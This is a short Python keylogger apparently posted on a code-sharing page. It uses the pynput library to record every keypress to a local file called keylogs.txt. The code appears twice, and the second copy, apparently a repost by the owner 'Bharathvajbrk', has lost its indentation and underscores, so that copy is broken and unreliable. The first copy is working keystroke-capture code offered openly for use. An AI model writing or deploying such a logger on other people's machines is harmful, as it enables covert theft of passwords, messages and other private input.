from pynput import keyboard

class KeyLogger:
    def __init__(self, filename: str = "keylogs.txt"):
        self.filename = filename
        self.log_file = None

    def get_char(self, key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        char = self.get_char(key)
        self.log_key(char)

    def log_key(self, char):
        with open(self.filename, 'a', encoding='utf-8') as log_file:
            log_file.write(char)

    def main(self):
        try:
            listener = keyboard.Listener(on_press=self.on_press)
            listener.start()
            print("Keylogger is running. Press 'Ctrl+C' to stop.")
            listener.join()
        except KeyboardInterrupt:
            print("\nKeylogger stopped. Logged keys saved to", self.filename)

if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()

Bharathvajbrk
7 minutes ago
Â·
Owner
from pynput import keyboard

class KeyLogger:
def init(self, filename: str = "keylogs.txt"):
self.filename = filename
self.log_file = None

def get_char(self, key):
    try:
        return key.char
    except AttributeError:
        return str(key)

def on_press(self, key):
    char = self.get_char(key)
    self.log_key(char)

def log_key(self, char):
    with open(self.filename, 'a', encoding='utf-8') as log_file:
        log_file.write(char)

def main(self):
    try:
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        print("Keylogger is running. Press 'Ctrl+C' to stop.")
        listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger stopped. Logged keys saved to", self.filename)
if name == 'main':
logger = KeyLogger()
logger.main()
